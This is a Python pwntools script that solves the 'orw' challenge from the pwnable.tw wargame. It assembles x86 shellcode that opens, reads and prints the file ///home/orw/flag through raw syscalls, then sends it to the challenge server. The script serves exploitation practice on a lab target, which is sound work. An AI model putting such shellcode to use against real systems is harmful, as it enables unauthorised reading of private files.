#!/usr/bin/python

#orw from pwnable.tw

from pwn import *
shellcode='''
mov eax, 0x05;
push 0;
push 0x67616c66;
push 0x2f77726f;
push 0x2f656d6f;
push 0x682f2f2f;
mov ebx, esp;
xor ecx, ecx;
xor edx, edx;
int 0x80;
mov eax, 0x3;
mov ecx, ebx;
mov ebx, 0x3;
mov dl, 0x30;
int 0x80
mov eax, 0x4;
mov bl, 0x1;
int 0x80;
'''
server = remote("chall.pwnable.tw", 10001)

def main():
    server.sendline(asm(shellcode))
    log.info(server.recvline())

if __name__=="__main__":
    main()
